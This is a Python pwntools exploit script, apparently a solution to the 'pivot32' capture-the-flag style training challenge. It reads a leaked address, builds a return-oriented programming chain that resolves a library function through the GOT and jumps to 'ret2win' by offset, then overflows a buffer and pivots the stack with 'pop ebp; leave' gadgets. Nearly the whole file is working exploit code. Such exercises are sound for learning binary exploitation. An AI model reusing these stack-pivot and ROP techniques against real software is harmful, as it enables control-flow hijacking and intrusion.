from pwn import *
import re


def to_clipboard(data):
    from subprocess import Popen, PIPE
    xsel = Popen(['xsel', '-bi'], stdin=PIPE)
    xsel.communicate(input=data)
    log.info(f"put to clipboard: {data}")


def update_gdb_attach(binary, attach_file="attach.gdb"):
    pid = process(["pgrep", binary]).recvall()
    update_script = "/home/kali/bin/update-attach-gdb.sh"
    process([update_script, attach_file, pid])
    to_clipboard(pid)


def call_resolved_adr_with_off(adr, offset):
    # MOVE GOT ADR INTO REG
    # 0x0804882c : pop eax ; ret
    pop_eax_gadget = pack(0x0804882c, 32)
    # 0x08048830 : mov eax, dword ptr [eax] ; ret
    lea_into_eax_gadget = pack(0x08048830, 32)

    # ARITHMETIC GADGETS
    # 0x080484a9 : pop ebx ; ret
    pop_ebx_gadget = pack(0x080484a9, 32)
    # 0x08048833 : add eax, ebx ; ret
    add_eax_ebx_gadget = pack(0x08048833, 32)

    # CALL GADGETS
    # 0x080485f0 : call eax
    call_eax_gadget = pack(0x080485f0, 32)

    chain = b""
    chain += pop_eax_gadget
    chain += pack(adr, 32)
    # foot got entry adr is in eax now
    chain += lea_into_eax_gadget
    # real foot adr is now in eax
    chain += pop_ebx_gadget
    chain += pack(offset, 32)
    chain += add_eax_ebx_gadget
    # real foot adr + offset = real ret2win adr
    chain += call_eax_gadget
    return chain


lib = ELF("./libpivot32.so")
elf = ELF("./pivot32")

# before calling foothold_function
# got
# 123 foothold_function : bullshit

# after calling foothold_function
# got
# 123 foothold_function : realAdr

# puts(123)
binary = "pivot32"


foot_plt = elf.plt["foothold_function"]
puts_plt = elf.plt["puts"]
foot_got = elf.got["foothold_function"]
exit_plt = elf.plt["exit"]

ret2win_off = lib.symbols["ret2win"]
log.info(f"ret2win_off: {ret2win_off}")
foothold_function_off = lib.symbols["foothold_function"]
log.info(f"foothold_function_off: {foothold_function_off}")

lib_function_offset = ret2win_off - foothold_function_off
log.info(f"lib_function_offset: {lib_function_offset}")


log.info("foot_plt: " + hex(foot_plt) + f" {foot_plt}")
log.info("puts_plt: " + hex(puts_plt) + f" {puts_plt}")
log.info("foot_got: " + hex(foot_got) + f" {foot_got}")
log.info("exit_plt: " + hex(exit_plt) + f" {exit_plt}")


def pivot_to_adr(adr):
    # 0x0804889b : pop ebp ; ret
    pop_ebp_gadget = 0x0804889b
    # 0x080485f5 : leave ; ret
    mov_ebp_into_esp_gadget = 0x080485f5
    chain = b""
    chain += pack(pop_ebp_gadget, 32)
    chain += pack(adr-4, 32)
    chain += pack(mov_ebp_into_esp_gadget, 32)
    return chain


p = process([binary])
r = p.recv().decode("utf-8")
log.info(f"r: {r}")

sleep(2)


index = r.find("0xf")
pivot_adr = r[index:index+10]
log.info(f"pivot_adr: {pivot_adr}")

pivot_adr = int(pivot_adr, 16)
log.info(f"pivot_adr: {pivot_adr}")


update_gdb_attach(binary)

# LEAK REAL FOOT ADR
# payload = b""
# payload += pack(foot_plt, 32)
# payload += pack(puts_plt, 32)
# payload += pack(exit_plt, 32)   # ret
# payload += pack(foot_got, 32)


# pop foot_got adr in eax
# mov real foot adr in eax
# pop offset into ebx
# add offset to eax (real foot adr) -> eax contains real adr of ret2win
# call eax -> call real adr of ret2win

payload = b""
payload += pack(foot_plt, 32)
# now foot got entry is updated
payload += call_resolved_adr_with_off(foot_got, lib_function_offset)
payload += pack(exit_plt, 32)
payload += b"B"*4
payload += b"gill"


log.info(f"first payload: {payload}")
write("/tmp/docgil", payload)

input("before first payload send")

p.send(payload)
r = p.recv()
log.info(f"r: {r}")


payload = b""
payload += b"A"*44
payload += pivot_to_adr(pivot_adr)


log.info(f"second payload: {payload}")
write("/tmp/docgil2", payload)

input("before second payload send")


p.send(payload)
r = p.recvall()

log.info(f"r : {r }")


# r = p.recvall().replace(b"Thank you!\n", b"")
# log.info(f"r: {r}")
# foot_got_val = unpack(r[:4], 32)
# log.info("foot_got_val: " + hex(foot_got_val) + f" {foot_got_val}")
